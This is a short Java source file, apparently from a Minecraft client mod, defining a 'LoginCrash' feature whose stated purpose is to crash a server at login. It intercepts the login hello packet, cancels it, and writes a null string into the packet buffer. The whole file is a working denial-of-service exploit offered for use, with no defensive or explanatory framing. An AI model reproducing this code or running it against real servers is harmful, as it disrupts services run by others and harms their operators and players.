package me.dustin.crash.feature;

import me.dustin.crash.event.EventWriteLoginHelloPacket;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.feature.mod.core.Feature;

@Feature.Manifest(category = Feature.Category.MISC, description = "Tries to crash the server on login using null packets. (By 0x150)")
public class LoginCrash extends Feature {

    public LoginCrash() {
        super();
        setFeatureCategory(Category.valueOf("CRASH"));
    }

    @EventPointer
    private final EventListener<EventWriteLoginHelloPacket> eventWriteLoginHelloPacketEventListener = new EventListener<>(eventWriteLoginHelloPacket -> {
        toggleState();
        eventWriteLoginHelloPacket.cancel();
        eventWriteLoginHelloPacket.getPacketByteBuf().writeString(null);
    });

}
